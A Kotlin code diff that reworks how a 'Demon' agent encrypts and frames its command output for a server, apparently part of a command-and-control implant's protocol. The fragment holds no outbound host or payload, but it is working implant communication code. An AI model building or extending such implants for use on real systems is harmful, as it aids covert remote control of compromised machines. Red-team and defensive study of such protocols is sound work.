@@ -254,20 +254,29 @@ object FrameBuilder {
     fun buildOutput(agentId: Int, commandId: Int, requestId: Int,
                     payload: ByteArray, aesKey: ByteArray, aesIv: ByteArray): ByteArray {
 
-        val encrypted = if (payload.isNotEmpty()) AesCtr.encrypt(payload, aesKey, aesIv)
-                        else ByteArray(0)
-
-        // Body after SIZE field:
-        // MAGIC(4) + AGENTID(4) + CMDID(4) + REQID(4) + DATALEN(4) + encrypted(N)
-        val body = ByteBuffer
-            .allocate(4 + 4 + 4 + 4 + 4 + encrypted.size)
+        // The server calls DecryptBuffer on everything after COMMAND+REQID.
+        // Then ParseBytes() reads [4 BE len][data] from the decrypted content.
+        // So we must encrypt [4 BE len][payload] together so that after
+        // decryption ParseBytes() reads the correct length.
+        val plaintext = ByteBuffer
+            .allocate(4 + payload.size)
             .order(ByteOrder.BIG_ENDIAN)
-            .putInt(DEMON_MAGIC.toInt())    // MAGIC
-            .putInt(agentId)                // AGENT_ID
-            .putInt(commandId)              // COMMAND_ID  (plaintext, before decrypt)
-            .putInt(requestId)              // REQUEST_ID  (plaintext, before decrypt)
-            .putInt(encrypted.size)         // DATA_LEN    (ParseBytes length prefix)
-            .put(encrypted)                 // encrypted data
+            .putInt(payload.size)   // length prefix — encrypted together with data
+            .put(payload)
+            .array()
+
+        val encrypted = AesCtr.encrypt(plaintext, aesKey, aesIv)
+
+        // Frame body (after SIZE):
+        //   MAGIC(4 BE) + AGENTID(4 BE) + CMDID(4 BE) + REQID(4 BE) + encrypted([len+data])
+        val body = ByteBuffer
+            .allocate(4 + 4 + 4 + 4 + encrypted.size)
+            .order(ByteOrder.BIG_ENDIAN)
+            .putInt(DEMON_MAGIC.toInt())
+            .putInt(agentId)
+            .putInt(commandId)      // plaintext, read before DecryptBuffer
+            .putInt(requestId)      // plaintext, read before DecryptBuffer
+            .put(encrypted)         // [len(4)][data] all encrypted
             .array()
 
         val sizeBE = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
